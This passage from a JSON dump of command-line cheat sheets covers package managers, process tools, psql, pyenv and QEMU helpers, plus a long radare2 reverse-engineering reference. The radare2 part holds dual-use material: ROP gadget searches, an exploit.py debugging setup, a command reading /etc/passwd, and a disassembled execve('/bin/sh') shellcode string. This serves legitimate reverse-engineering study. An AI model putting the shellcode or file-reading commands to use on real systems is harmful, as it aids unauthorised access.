          "content": "---\ntags: [ packaging ]\n---\n# To create a Slackware package from a structured directory and sub-tree:\ncd <dir>\nsu - c 'makepkg --linkadd y --chown n $foo-1.0.3-x86_64-1_tag.tgz'\n\n# To install a Slackware package:\ninstallpkg foo-1.0.3-x86_64-1.tgz\n\n# To install a Slackware package to non-standard location:\nROOT=/path/to/dir installpkg foo-1.0.4-noarch-1.tgz\n\n# To create backup of files that will be overwritten when installing:\ntar czvf /tmp/backup.tar.gz $(installpkg --warn foo-1.0.4-noarch-1.tgz)\n\n# To upgrade a Slackware package including files only in new version:\nupgradepkg --install-new foo-1.0.6-noarch-1.tgz\n\n# To upgrade a Slackware package even if version is the same:\nupgradepkg --reinstall foo-1.0.4-noarch-1.tgz\n\n# To remove a Slackware package:\nremovepkg foo-0.2.8-x86_64-1\n\n# To remove a Slackware package, retaining a backup (uninstalled) copy:\nremovepkg -copy foo-0.2.8-x86_64-1  # -> /var/log/setup/tmp/preserved_packages/foo...\n"
        },
        {
          "name": "pkill",
          "type": "blob",
          "size": 0.126953125,
          "content": "# To kill a process using its full process name:\npkill <process-name>\n\n# To kill a process by its partial name:\npkill -f <string>\n"
        },
        {
          "name": "plenv",
          "type": "blob",
          "size": 0.7060546875,
          "content": "---\ntags: [ perl ]\n---\nSee https://github.com/tokuhirom/plenv\n\n# list available perl versions\nplenv install --list\n\n# install perl5 binary\nplenv install <version> [Configure options]\n\n# execute command on current perl\nplenv exec <command>\n\n# change global default perl to a particular version\nplenv global <version>\n\n# change local perl to a particular version\nplenv local <version>\n\n# run this command after install cpan module, contains executable script.\nplenv rehash\n\n# install cpanm to current perl\nplenv install-cpanm\n\n# migrate modules from one version to another\nplenv migrate-modules <from-version> <to-version>\n\n# locate a program file in the plenv's path\nplenv which <program>\n\n# display version\nplenv --version\n"
        },
        {
          "name": "podman",
          "type": "blob",
          "size": 0.2236328125,
          "content": "# List running container\npodman ps\n\n# List all containers created\npodman ps -a\n\n# Pull an image\npodman pull vaultwarden/server:latest\n\n# List images in local storage\npodman images\n\n# Delete a container\npodman rm <container-name>\n"
        },
        {
          "name": "poetry",
          "type": "blob",
          "size": 1.0732421875,
          "content": "---\nsyntax: bash\ntags: [ python, deps ]\n---\n# Regenerate lock\npoetry lock --no-update\n\n# New package\npoetry new my-package\n\n# Init project\npoetry init\n\n# Install project\npoetry install\npoetry install --no-dev\n\n# Remove old dependencies no longer present in the lock file\npoetry install --remove-untracked\n\n# Update package(s)\npoetry update\npoetry update <package> ...\n\n# Add deps\npoetry add <package> <package>@latest\npoetry add -D flake8 black isort pytest pytest-cov mypy types-requests\npoetry add git+https://github.com/sdispater/pendulum.git#develop\npoetry add git+ssh://git@github.com/sdispater/pendulum.git#2.0.5\npoetry add ./my-package/ ../my-package-2/\npoetry add \"<package>[<extra>]\"\n\n# Editable mode\n```toml\n[tool.poetry.dependencies]\nmy-package = {path = \"../my/path\", develop = true}\n```\n\n# Remove package\npoetry remove <package>\n\n# Show packages\npoetry show\n\n# Build source and wheels\npoetry build\n\n# Publish package\npoetry publish\n\n# Run commands\npoetry run python -v\n\n# Scripts\n```toml\n[tool.poetry.scripts]\nmy-script = \"my_module:main\"\n```\npoetry run my-script\n\n# Shell\npoetry shell\n"
        },
        {
          "name": "popd",
          "type": "blob",
          "size": 0.0654296875,
          "content": "# To return to the directory at the top of the `pushd' stack:\npopd\n"
        },
        {
          "name": "port",
          "type": "blob",
          "size": 2.361328125,
          "content": "---\nsyntax: bash\ntags: [ mac, deps ]\n---\n# Update to the latest version of MacPorts, and sync the latest ports definitions:\nsudo port selfupdate\n\n# List all ports that are currently considered outdated:\nport echo outdated\n\n# Upgrade all currently outdated ports:\nsudo port upgrade outdated\n\n# List all ports that are currently *inactive*:\n# (A port is usually deactivated when a newer version of it gets installed.)\nport echo inactive\n\n# Completely remove and uninstall all *deactivated* ports:\n# This is very useful to do after upgrading all your outdated ports.\nsudo port uninstall inactive\n\n# Install a particular port:\nsudo port install <name>\n\n# Install a particular port with full debug output:\nsudo port -d install <name>\n\n# Uninstall a particular port:\nsudo port uninstall <name>\n\n# Completely clean out all temporary assets of a port, such as build files,\n# the working directory and any downloaded archives:\nsudo port clean -f --all <name>\n\n# Upgrade a particular port\nsudo port upgrade <name>\n\n# Deactivate a currently active port:\nsudo port deactivate <name>\n\n# Activate a currently deactive port:\nsudo port activate <name>\n\n# Search for a port\nport search <name>\n\n# View information about a particular port\nport info <name>\n\n# List the ports that have been explicitly requested by the user to be installed:\nport echo requested\n\n# List all ports that are currently installed:\nport echo installed\n\n# List the ports that this port depends on:\nport deps <name>\n\n# List the ports that this port depends on, then recursively list the ports\n# that THOSE ports depend on as well:\nport rdeps <name>\n\n# List the ports that depend on this port:\nport dependents <name>\n\n# List the ports that depend on this port, then recursively list the ports\n# that depend on THOSE:\nport rdependents <name>\n\n# List the files installed by a particular port:\n# (Only works for currently installed ports.)\nport contents <name>\n\n# View a ports' notes, if any (these are usually displayed right after a port \n# is installed):\nport notes <name>\n\n# Print the path to a port within the ports tree:\nport dir <name>\n\n# Print the path to the archive used to activate a given port: \n# (Only works for currently installed ports)\nport location <name>\n\n# Print the path to a ports' Portfile:\nport file <name>\n\n# Print the path to the working directory for a port, if it exists:\nport work <name>\n\n# View help on a sub-command:\nport help <command>\n"
        },
        {
          "name": "ps",
          "type": "blob",
          "size": 0.328125,
          "content": "# To list every process on the system:\nps aux\n\n# To list a process tree:\nps axjf\n\n# To list every process owned by foouser:\nps -aufoouser\n\n# To list every process with a user-defined format:\nps -eo pid,user,command\n\n# Exclude grep from your grepped output of ps.\n# Add [] to the first letter. Ex: sshd -> [s]shd\nps aux | grep '[h]ttpd'\n"
        },
        {
          "name": "psql",
          "type": "blob",
          "size": 0.947265625,
          "content": "---\ntags: [ database ]\n---\n# psql is the PostgreSQL terminal interface. The following commands were tested on version 9.5.\n# Connection options:\n# -U username (if not specified current OS user is used).\n# -p port.\n# -h server hostname/address.\n\n# Connect to a specific database:\npsql -U <username> -h <host> -d <database>\n\n# Get databases on a server:\npsql -U <username> -h <host> --list\n\n# Execute sql query and save output to file:\npsql -U <username> -d <database> -c 'select * from tableName;' -o <outfile>\n\n# Execute query and get tabular html output:\npsql -U <username> -d <database> -H -c 'select * from tableName;'\n\n# Execute query and save resulting rows to csv file:\n# (if column names in the first row are not needed, remove the word 'header')\npsql -U <username> -d <database> -c 'copy (select * from tableName) to stdout with csv header;' -o <outfile>\n\n# Read commands from file:\npsql -f <outfile>\n\n# Restore databases from file:\npsql -f <outfile> <username>\n"
        },
        {
          "name": "pushd",
          "type": "blob",
          "size": 0.142578125,
          "content": "# To pushes your current directory to the top of a stack while changing to the specified directory:\npushd <directory>\n\n# To return use popd:\npopd\n"
        },
        {
          "name": "pwd",
          "type": "blob",
          "size": 0.0625,
          "content": "# Show the absolute path of your current working directory:\npwd\n"
        },
        {
          "name": "pyenv",
          "type": "blob",
          "size": 0.875,
          "content": "---\nsyntax: bash\ntags: [ python, environments ]\n---\n# Install the specified version of Python:\npyenv install <version>\n\n# Set the specified version of Python as system's default:\npyenv global <version>\n\n# Set the specified version of Python to be used in the current directory:\npyenv local <version>\n\n# Create a virtual environment based on the specified Python version (requires `pyenv-virtualenv` plugin):\npyenv virtualenv <version> <virtualenv_name>\n\n# Activate a python verison or virtualenv in the current shell (requires `pyenv-virtualenv` plugin):\npyenv activate <virtualenv_name>\n\n# Activate a python version or virtualenv in a new shell (requires `pyenv-virtualenv` plugin):\npyenv shell <virtualenv_name>\n\n# Uninstall the specified version of Python:\npyenv uninstall <version>\n\n# List the versions installed:\npyenv versions\n\n# Check the version of python currently in use:\npyenv version\n"
        },
        {
          "name": "python",
          "type": "blob",
          "size": 0.388671875,
          "content": "# Basic example of server with python\n# Will start a Web Server in the current directory on port 8000\n# go to http://127.0.0.1:8000\n\n# Python v2.7\npython -m SimpleHTTPServer\n# Python 3\npython -m http.server 8000\n\n# SMTP-Server for debugging, messages will be discarded, and printed on stdout.\npython -m smtpd -n -c DebuggingServer localhost:1025\n\n# Pretty print a json\npython -m json.tool foo.json\n"
        },
        {
          "name": "quickemu",
          "type": "blob",
          "size": 2.9296875,
          "content": "---\ntags: [ virtualization ]\n---\n# Run a specific vm:\nquickemu --vm <path/to/vm.conf>\n\n# Run a specific vm with a spice display:\nquickemu --vm <path/to/vm.conf> --display spice\n\n# Run a specific vm with a braille terminal display - Version > 3.11 and working brltty required:\nquickemu --vm <path/to/vm.conf> --accessible braille --display sdl\n# or:\nquickemu --vm <path/to/vm.conf> --acc brl --display sdl\n\n## All the optional parameters:\n\n\n  --braille                         : Enable braille support. Requires SDL.\n  --delete-disk                     : Delete the disk image and EFI variables\n  --delete-vm                       : Delete the entire VM and it's configuration\n  --display                         : Select display backend. 'sdl' (default), 'gtk', 'none', 'spice' or 'spice-app'\n  --fullscreen                      : Starts VM in full screen mode (Ctl+Alt+f to exit)\n  --ignore-msrs-always              : Configure KVM to always ignore unhandled machine-specific registers\n  --screen <screen>                 : Use specified screen to determine the window size.\n  --shortcut                        : Create a desktop shortcut\n  --snapshot apply <tag>            : Apply/restore a snapshot.\n  --snapshot create <tag>           : Create a snapshot.\n  --snapshot delete <tag>           : Delete a snapshot.\n  --snapshot info                   : Show disk/snapshot info.\n  --status-quo                      : Do not commit any changes to disk/snapshot.\n  --viewer <viewer>                 : Choose an alternative viewer. @Options: 'spicy' (default), 'remote-viewer', 'none'\n  --ssh-port <port>                 : Set ssh-port manually\n  --spice-port <port>               : Set spice-port manually\n  --public-dir <path>               : expose share directory. @Options: '' (default: xdg-user-dir PUBLICSHARE), '<directory>', 'none'\n  --monitor <type>                  : Set monitor connection type. @Options: 'socket' (default), 'telnet', 'none'\n  --monitor-telnet-host <ip/host>   : Set telnet host for monitor. (default: 'localhost')\n  --monitor-telnet-port <port>      : Set telnet port for monitor. (default: '4440')\n  --monitor-cmd <cmd>               : Send command to monitor if available. (Example: system_powerdown)\n  --serial <type>                   : Set serial connection type. @Options: 'socket' (default), 'telnet', 'none'\n  --serial-telnet-host <ip/host>    : Set telnet host for serial. (default: 'localhost')\n  --serial-telnet-port <port>       : Set telnet port for serial. (default: '6660')\n  --keyboard <type>                 : Set keyboard. @Options: 'usb' (default), 'ps2', 'virtio'\n  --keyboard_layout <layout>        : Set keyboard layout.\n  --mouse <type>                    : Set mouse. @Options: 'tablet' (default), 'ps2', 'usb', 'virtio'\n  --usb-controller <type>           : Set usb-controller. @Options: 'ehci' (default), 'xhci', 'none'\n  --extra_args <arguments>          : Pass additional arguments to qemu\n  --version                         : Print version\n"
        },
        {
          "name": "quickget",
          "type": "blob",
          "size": 0.4306640625,
          "content": "---\ntags: [ virtualization ]\n---\n# Download a release image and prepare a Qemu vm config:\nquickget <OS> <Release> [<Edition>|<Type>|<DM Option>|<Windows Language>]\n\n# Print list of supported Releases and Editions for <OS>:\nquickget <OS>\n\n# Download an OS Release image and prepare a Qemu vm config - if Edition is not specified the default will be used:\nquickget <OS> <Release>\n\n# Print a csv list of all supported OS variants\nquickget list\n"
        },
        {
          "name": "r2",
          "type": "blob",
          "size": 22.17578125,
          "content": "# Command Line options\n\t-L: List of supported IO plugins\n\n\t-q: Exit after processing commands\n\n\t-w: Write mode enabled\n\n\t-i: Interprets a r2 script\n\n\t-A: Analize executable at load time (xrefs, etc)\n\n\t-n: Bare load. Do not load executable info as the entrypoint\n\n\t-c'cmds': Run r2 and execute commands (eg: r2 -wqc'wx 3c @ main')\n\n\t-p: Creates a project for the file being analyzed (CC add a comment when opening a file as a project)\n\n\t-: Opens r2 with the malloc plugin that gives a 512 bytes memory area to play with (size can be changed); Similar to r2 malloc://512\n\n-----------------------------------------------------------------------------------------------------------------------------\n\n# Configuration properties\n\te: Returs configuration properties\n\t\n\te <property>: Checks a specific property:\n    \t\te asm.tabs => false\n\n\te <property>=<value>: Change property value\n    \t\te asm.arch=ppc\n\n\te? help about a configuration property\n    \t\te? cmd.stack\n\n\t\n\t\n\t# Show comments at right of disassembly if they fit in screen\n\t\te asm.cmtright=true\n\n\t# Shows pseudocode in disassembly. Eg mov eax, str.ok = > eax = str.ok\n\t\te asm.pseudo = true\n\n\t# Display stack and register values on top of disasembly view (visual mode)\n\t\te cmd.stack = true\n\n\t# Solarized theme\n\t\teco solarized\n\n\t# Use UTF-8 to show cool arrows that do not look like crap :)\n\t\te scr.utf8 = true\n\n-----------------------------------------------------------------------------------------------------------------------------\n\n# Basic Commands\n\n\t; Command chaining: x 3;s+3;pi 3;s+3;pxo 4;\n    \n\t| Pipe with shell commands: pd | less\n    \n\t! Run shell commands: !cat /etc/passwd\n    \n\t!! Escapes to shell, run command and pass output to radare buffer\n    \t\t\n\t\tNote: \tThe double exclamation mark tells radare to skip the plugin list to find an IO plugin handling this\n\t\t\tcommand to launch it directly to the shell. A single one will walk through the io plugin list.\n\n    \t` Radare commands: wx `!ragg2 -i exec`\n    \n\t~ grep\n    \n\t~! grep -v\n    \n\t~[n] grep by columns afl~[0]\n\n    \t~:n grep by rows afl~:0\n\t\n\t<command>~.. less/more mode\n\n\t+-------------------------------------------------------------------\n\t\n\tpi~mov,eax            ; lines with mov or eax\n    \tpi~mov&eax            ; lines with mov and eax\n    \tpi~mov,eax:6          ; 6 first lines with mov or eax\n    \tpd 20~call[0]:0       ; grep first column of the first row matching 'call'\n\t\n\t+-------------------------------------------------------------------\n\n\t.cmd Interprets command output\n\t\n\t+-------------------------------------------------------------------\n\t\n\tis* prints symbolos\n\t.is* interprets output and define the symbols in radare (normally they are already loaded if r2 was not invoked with -n)\n\t\n\t+-------------------------------------------------------------------\n\t\n\t.. repeats last commands (same as enter \\n)\n    \t\n\t( Used to define and run macros\n    \n\t$ Used to define alias\n    \n\t$$: Resolves to current address\n    \t\n\tOffsets (@) are absolute, we can use $$ for relative ones @ $$+4\n    \n\t? Evaluate expression\n\t+-------------------------------------------------------------------\n\n\t[0x00000000]> ? 33 +2\n\t35 0x23 043 0000:0023 35 00100011 35.0 0.000000\n\tNote: | and & need to be escaped\n\n\t+-------------------------------------------------------------------\n\n\t?$? Help for variables used in expressions\n    \n\t$$: Here\n    \n\t$s: File size\n    \n\t$b: Block size\n    \n\t$l: Opcode length\n    \n\t$j: When $$ is at a jmp, $j is the address where we are going to jump to\n    \n\t$f: Same for jmp fail address\n\t\n\t$m: Opcode memory reference (e.g. mov eax,[0x10] => 0x10)\n    \n\t??? Help for ? command\n    \n\t?i Takes input from stdin. Eg ?i username\n    \n\t?? Result from previous operations\n    \n\t?s from to [step]: Generates sequence from to every\n    \n\t?p: Get physical address for given virtual address\n    \n\t?P: Get virtual address for given physical one\n    \n\t?v Show hex value of math expr\n\n\t+-------------------------------------------------------------------\n\n\t?v 0x1625d4ca ^ 0x72ca4247 = 0x64ef968d\n\t?v 0x4141414a - 0x41414140  = 0xa\n\n\t+-------------------------------------------------------------------\n\n\t?l str: Returns the length of string\n    \n\t@@: Used for iteractions\n\n\t+-------------------------------------------------------------------\n\n\twx ff @@10 20 30      Writes ff at offsets 10, 20 and 30\n\twx ff @@`?s  1 10 2`  Writes ff at offsets 1, 2 and 3\n\twx 90 @@ sym.*        Writes a nop on every symbol\n\n\t+-------------------------------------------------------------------\n\n# Positioning\n\n\ts address: Move cursor to address or symbol\n\t\n\ts-5 (5 bytes backwards)\n\t\n\ts- undo seek\n\n\ts+ redo seek\n\n# Block Size\n\n\tb size: Change block size\n\n# Analyze\n\t\n\taa: Analyze all (fcns + bbs) same that running r2 with -A\n\n\tahl <length> <range>: fake opcode length for a range of bytes\n\t\n\tad: Analyze data\n\n\tad@rsp (analize the stack)\n\n\t+ Normal mode\n\t\t\n\t\taf: Analyze functions\n\n\t\tafl: List all functions\n    \t\t\tnumber of functions: afl~?\n\n\t\tafi: Returns information about the functions we are currently at\n\n\t\tafr: Rename function: structure and flag\n\t\n\t\tafr off: Restore function name set by r2\n\n\t\tafn: Rename function\n\t\t\n\t\tafn strlen 0x080483f0\n\n\t\taf-: Removes metadata generated by the function analysis\n\n\t\taf+: Define a function manually given the start address and length\n\t\t\taf+ 0xd6f 403 checker_loop\n\n\t\taxt: Returns cross references to (xref to)\n\n\t\taxf: Returns cross references from (xref from)\n\t\n\t+ Visual mode\n\n\t\td, f: Function analysis\n\n\t\td, u: Remove metadata generated by function analysis\n\n\t+ Opcode analysis\n\t\t\n\t\tao x: Analize x opcodes from current offset\n\n\t\ta8 bytes: Analize the instruction represented by specified bytes\n\n# Information\n\n\t\tiI: File info\n\n\t\tiz: Strings in data section\n\n\t\tizz: Strings in the whole binary\n\t\n\t\tiS: Sections\n\t\t\tiS~w returns writable sections\n\n\t\tis: Symbols\n\t\t\tis~FUNC exports\n\t\t\n\t\til: Linked libraries\n\n\t\tii: Imports\n\n\t\tie: Entrypoint\n\n\t+ Mitigations\n\n\t\ti~pic : check if the binary has position-independent-code\n\t\n\t\ti~nx : check if the binary has non-executable stack\n\n\t\ti~canary : check if the binary has canaries\n\n# Print\n\n\tpsz n @ offset: Print n zero terminated String\n\n\tpx n @ offset: Print hexdump (or just x) of n bytes\n\n\tpxw n @ offset: Print hexdump of n words\n\t\tpxw size@offset  prints hexadecimal words at address\n\n\tpd n @ offset: Print n opcodes disassambled\n\n\tpD n @ offset: Print n bytes disassembled\n\n\tpi n @ offset: Print n instructions disassambeled (no address, XREFs, etc. just instrunctions)\n\n\tpdf @ offset: Print disassembled function\n\t\tpdf~XREF (grep: XREFs)\n\t\tpdf~call (grep: calls)\n\n\tpcp n @ offset: Print n bytes in python string output.\n\t\tpcp 0x20@0x8048550\n\t\timport struct\n\t\tbuf = struct.pack (\"32B\",\n    \t\t\t0x55,0x89,0xe5,0x83,0xzz,0xzz,0xzz,0xzz,0xf0,0x00,0x00,\n\t\t\t0x00,0x00,0xc7,0x45,0xf4,0x00,0x00,0x00,0x00,0xeb,0x20,\n\t\t\t0xc7,0x44,0x24,0x04,0x01,0x00,0x00,0x00,0xzz,0xzz)\n\n\tp8 n @ offset: Print n bytes (8bits) (no hexdump)\n\t\n\tpv: Print file contents as IDA bar and shows metadata for each byte (flags , ...)\n\n\tpt: Interpret data as dates\n\n\tpf: Print with format\n\n\tpf.: list all formats\n\n\tp=: Print entropy ascii graph\n\n# Write\n\n\twx: Write hex values in current offset\n    \t\twx 123456\n    \t\twx ff @ 4\n\n\twa: Write assembly\n    \t\twa jnz 0x400d24\n\n\twc: Write cache commit\n\n\twv: Writes value doing endian conversion and padding to byte\n\n\two[x]: Write result of operation\n    \t\twow 11223344 @102!10\n        \t\twrite looped value from 102 to 102+10\n        \t\t0x00000066  1122 3344 1122 3344 1122 0000 0000 0000\n    \n\twox 0x90\n        \tXOR the current block with 0x90. Equivalent to wox 0x90 $$!$b (write from current position, a whole block)\n    \t\n\twox 67 @4!10\n        \tXOR from offset 4 to 10 with value 67\n\n\twf file: Writes the content of the file at the current address or specified offset (ASCII characters only)\n\n\twF file: Writes the content of the file at the current address or specified offset\n\n\twt file [sz]: Write to file (from current seek, blocksize or sz bytes)\n    \t\tEg: Dump ELF files with wt @@ hit0* (after searching for ELF headers: \\x7fELF)\n\n\twoO 41424344 : get the index in the De Bruijn Pattern of the given word\n\n# Flags\n\n\tf: List flags\n\n\tf label @ offset: Define a flag `label` at offset\n    \t\tf str.pass_len @ 0x804999c\n\n\tf -label: Removes flag\n\n\tfr: Rename flag\n\n\tfd: Returns position from nearest flag (looking backwards). Eg => entry+21\n\n\tfs: Show all flag spaces\n\n\tfs flagspace: Change to the specified flag space\n\n\tfe loop and create numbered flags:\n\t\t\n\t\t1. fs demo_flagspace\n\t\t2. fe demo_flagspace @@=`pdf~jne[1]`\n\n# Yank & Paste\n\n\ty n: Copies n bytes from current position\n\n\ty: Shows yank buffer contentent with address and length where each entry was copied from\n\n\typ: Prints yank buffer\n\n\tyy offset: Paste the contents of the yank buffer at the specified offset\n\n\tyt n target @ source: Yank to. Copy n bytes fromsource to target address\n\n# Visual Mode\n\n\tq: Exits visual mode\n\n\thjkl: move around (or HJKL) (left-down-up-right)\n\n\to: go/seek to given offset\n\n\t?: Help\n\n\t.: Seek EIP\n\n\t<enter>: Follow address of the current jump/call\n\n\t:cmd: Enter radare commands. Eg: x @ esi\n\n\td[f?]: Define cursor as a string, data, code, a function, or simply to undefine it.\n    \t\tdr: Rename a function\n    \t\tdf: Define a function\n\n\tv: Get into the visual code analysis menu to edit/look closely at the current function.\n\n\tp/P: Rotate print (visualization) modes\n    \t\thex, the hexadecimal view\n    \t\tdisasm, the disassembly listing\n        \t\tUse numbers in [] to follow jump\n        \t\tUse \"u\" to go back\n    \t\t\n\t\tdebug, the debugger\n    \t\twords, the word-hexidecimal view\n    \t\tbuf, the C-formatted buffer\n    \t\tannotated, the annotated hexdump.\n\n\tc: Changes to cursor mode or exits the cursor mode\n    \t\tselect: Shift+[hjkl]\n    \t\ti: Insert mode\n    \t\ta: assembly inline\n    \t\tA: Assembly in visual mode\n    \t\ty: Copy\n    \t\tY: Paste\n    \t\tf: Creates a flag where cursor points to\n    \t\t<tab> in the hexdump view to toggle between hex and strings columns\n\n\tV: View ascii-art basic block graph of current function\n\n\tW: WebUI\n\n\tx, X: XREFs to current function. (\"u\" to go back)\n\n\tt: track flags (browse symbols, functions..)\n\n\tgG: Begging or end of file\n\n\tHUD\n    \t\t_ Show HUD\n    \t\tbackspace: Exits HUD\n    \t\tWe can add new commands to HUD in: radare2/shlr/hud/main\n\n\t;[-]cmt: Add/remove comment\n\n\tm<char>: Define a bookmark\n\n\t'<char>: Go to previously defined bookmark\n\n# ROP\n\t\n\t/R opcodes: Search opcodes\n    \t\n\t/R pop,pop,ret\n\t\n\t/Rl opcodes: Search opcodes and print them in linear way\n\t\n\t/Rl jmp eax,call ebx\n\n\t/a: Search assembly\n    \t\n\t/a jmp eax\n\n\tpda: Returns a library of gadgets that can be use. These gadgets are obtained by disassmbling byte per byte instead of obeying to opcode leng\n\n\te search.roplen = 4  (change the depth of the search, to speed-up the hunt)\n\n# Searching\n\n\t/ bytes: Search bytes\n    \t\t\\x7fELF\n\n\t+-------------------------------------------------------------------\n\n\tpush ebp\n\tmov ebp, esp\n\n\tOpcodes: 5589e5\n\n\t/x 5589e5\n\t\t[# ]hits: 54c0f4 < 0x0804c600  hits = 1\n    \t\t0x08049f70 hit0_0 5589e557565383e4f081ec\n    \t\t0x0804c31a hit0_1 5589e583ec18c704246031\n    \t\t0x0804c353 hit0_2 5589e583ec1889442404c7\n    \t\t0x0804c379 hit0_3 5589e583ec08e87cffffff\n    \t\t0x0804c3a2 hit0_4 5589e583ec18c70424302d\n\n\t\tpi 5 @@hit* (Print 5 first instructions of every hit)\n\n\t+-------------------------------------------------------------------\n\n\tIts possible to run a command for each hit. Use the cmd.hit property:\n\n\t\te cmd.hit=px\n\n# Comments and defines\n\n\tCd [size]: Define as data\n\n\tC- [size]: Define as code\n\n\tCs [size]: Define as String\n\n\tCf [size]: Define as struct\n    \t\tWe can define structures to be shown in the disassmbly\n\n\tCC: List all comments or add a new comment in console mode\n    \t\tC* Show all comments/metadata\n    \t\tCC <comment> add new comment\n    \t\tCC- remove comment\n\n# Magic files\n\n\tpm: Print Magic files analysis\n    \t\t[0x00000000]> pm\n    \t\t0x00000000 1 ELF 32-bit LSB executable, Intel 80386, version 1\n\n\t/m [magicfile]: Search magic number headers with libmagic\n\n\tsearch.align\n\tsearch.from (0 = beginning)\n\tsearch.to (0 = end)\n\tsearch.asmstr\n\tsearch.in\n\n# Yara\n\t\n\t:yara scan\n\n# Zignatures\n\n\tzg <language> <output file>: Generate signatures\n\t\teg: zg go go.z\n\n\tRun the generated script to load signatures\n    \t\teg: . go.z\n\n\tz: To show signatures loaded:\n\n\t+-------------------------------------------------------------------\n\t\n\tr2-(pid2)> pd 35 @ 0x08049adb-10\n\t|          0x08049adb   call fcn.0805b030\n\t|             fcn.0805b030(unk, unk, unk, unk) ; sign.sign.b.sym.fmt.Println\n\t|          0x08049ae0   add esp, 0xc\n\t|          0x08049ae3   call fcn.08095580\n\n\t+-------------------------------------------------------------------\n\n# Compare Files\n\n\tr2 -m 0xf0000 /etc/fstab    ; Open source file\n\t\n\to /etc/issue                ; Open file2 at offset 0\n\t\n\to                           ; List both files\n\n\tcc offset: Diff by columns between current offset address and \"offset\"\n\n# Graphs\n\n\t+ Basic block graphs\n\t\t\n\t\taf: Load function metadata\n\n\t\tag $$ > a.dot: Dump basic block graph to file\n\n\t\tag $$ | xdot: Show current function basic block graph\n\n\t+ Call graphs\n\n\t\taf: Load function metadata\n\n\t\tagc $$ > b.dot: Dump basic block graph to file\n\n\t+ Convert .dot in .png\n\n\t\tdot -Tpng -o /tmp/b.png b.dot\n\n\t+ Generate graph for file\n\n\t\tradiff2 -g main crackme.bin crackme.bin > /tmp/a\n\t\txdot /tmp/a\n\n# Debugger\n\n\t+ Start r2 in debugger mode. r2 will fork and attach\n\t\t\n\t\tr2 -d [pid|cmd|ptrace] (if command contains spaces use quotes: r2 -d \"ls /\")\n\t\t\n\t\tptrace://pid (debug backend does not notice, only access to mapped memory)\n\n\t+ Pass arguments\n\t\t\n\t\tr2 -d rarun2 program=pwn1 arg1=$(python exploit.py)\n\n\t+ Pass stdin\n\t\t\n\t\tr2 -d rarun2 program=/bin/ls stdin=$(python exploit.py)\n\n\t+ Commands\n\n\t\tdo: Reopen program\n\n\t\tdp: Shows debugged process, child processes and threads\n\n\t\tdc: Continue\n\n\t\tdcu <address or symbol>: Continue until symbol (sets bp in address, continua until bp and remove bp)\n\n\t\tdc[sfcp]: Continue until syscall(eg: write), fork, call, program address (To exit a library)\n\n\t\tds: Step in\n\n\t\tdso: Step out\n\n\t\tdss: Skip instruction\n\n\t\tdr register=value: Change register value\n\n\t\tdr(=)?: Show register values\n\n\t\tdb address: Sets a breakpoint at address\n    \t\t\tdb sym.main add breakpoint into sym.main\n    \t\t\tdb 0x804800 add breakpoint\n    \t\t\tdb -0x804800 remove breakpoint\n\n\t\tdsi (conditional step): Eg: \"dsi eax==3,ecx>0\"\n\n\t\tdbt: Shows backtrace\n\n\t\tdrr: Display in colors and words all the refs from registers or memory\n\n\t\tdm: Shows memory map (* indicates current section)\n    \t\t\t[0xb776c110]> dm\n    \t\t\tsys 0x08048000 - 0x08062000 s r-x /usr/bin/ls\n    \t\t\tsys 0x08062000 - 0x08064000 s rw- /usr/bin/ls\n    \t\t\tsys 0xb776a000 - 0xb776b000 s r-x [vdso]\n    \t\t\tsys 0xb776b000 * 0xb778b000 s r-x /usr/lib/ld-2.17.so\n    \t\t\tsys 0xb778b000 - 0xb778d000 s rw- /usr/lib/ld-2.17.so\n    \t\t\tsys 0xbfe5d000 - 0xbfe7e000 s rw- [stack]\n\n\t+ To follow child processes in forks (set-follow-fork-mode in gdb)\n\n\t\tdcf until a fork happen then use dp to select what process you want to debug.\n\n\t+ PEDA like details\n\t\t\n\t\tdrr;pd 10@-10;pxr 40@esp\n\n\t+ Debug in visual mode\n\n\t\ttoggl breakpoints with F2\n\t\tsingle-step with F7 (s)\n\t\tstep-over with F8 (S)\n\t\tcontinue with F9\n\n# WebGUI\n\t\n\t=h: Start the server\n\t=H: Start server and browser\n\n# rax2 - Base Conversion\n\n\t-e: Change endian\n\t\n\t-k: random ASCII art to represent a number/hash. Similar to how SSH represents keys\n\t\n\t-s: ASCII to hex\n    \t\trax2 -S hola (from string to hex)\n    \t\trax2 -s 686f6c61 (from hex to string)\n\n\t-S: binary to hex (for files)\n\t\n\t-N: pack an integer \n\t\trax2 -N 0x1234 # \\x34\\x12\\x00\\x00\n\n# rahash2 - Entropy, hashes and checksums\n\n\t-a: Specify the algorithm\n\n\t-b XXX: Block size\n\n\t-B: Print all blocks\n\n\t-a entropy: Show file entropy or entropy per block (-B -b 512 -a entropy)\n\t\n\t+ Rot13 with rahash2\n\t\trahash2 -E rot -S s:13 -s ‘Hello\\n’\n\n# radiff2 - File diffing\n\n\t-s: Calculate text distance from two files.\n\n\t-d: Delta diffing (For files with different sizes. Its not byte per byte)\n\n\t-C: Code diffing (instead of data)\n\n\t+-------------------------------------------------------------------\n\n\tDiff original and patched on x86_32, using graphdiff algorithm\n    \t\tradiff2 -a x86 -b32 -C original patched\n\n\tShow differences between original and patched on x86_32\n    \t\tradiff2 -a x86 -b32 original patched :\n\n\t+-------------------------------------------------------------------\n\n# rasm2 - Assembly/Disasembly\n \n\t-L: Supported architectures\n\n\t-a arch instruction: Sets architecture\n    \t\trasm2 -a x86 'mov eax,30' => b81e000000\n\n\t-b tam: Sets block size\n\n\t-d: Disassembly\n    \t\trasm2 -d b81e000000 => mov eax, 0x1e\n\n\t-C: Assembly in C output\n    \t\trasm2 -C 'mov eax,30' => \"\\xb8\\x1e\\x00\\x00\\x00\"\n\n\t-D: Disassemble showing hexpair and opcode\n    \t\trasm2 -D b81e0000 => 0x00000000   5               b81e000000  mov eax, 0x1e\n\n\t-f: Read data from file instead of ARG.\n\n\t-t: Write data to file\n\n\t+ Disassemble shellcode from hex stdin\n\n\t+-------------------------------------------------------------------\n\n\techo -n \"31c048bbd19d9691d08c97ff48f7db53545f995257545eb03b0f05\" | rasm2 -a x86 -b 64 -d -\n\t\txor eax, eax\n\t\tmovabs rbx, 0xff978cd091969dd1\n\t\tneg rbx\n\t\tpush rbx\n\t\tpush rsp\n\t\tpop rdi\n\t\tcdq\n\t\tpush rdx\n\t\tpush rdi\n\t\tpush rsp\n\t\tpop rsi\n\t\tmov al, 0x3b\n\t\tsyscall\n\n\t+-------------------------------------------------------------------\n\n# rafind2 - Search\n\n\t-Z: Look for Zero terminated strings\n\n\t-s str: Look for specifc string\n\n\t-X: Hex dump around output\n\n\t+ Search \"/bin/sh\" in libc\n\n\t\trafind2 -X -s 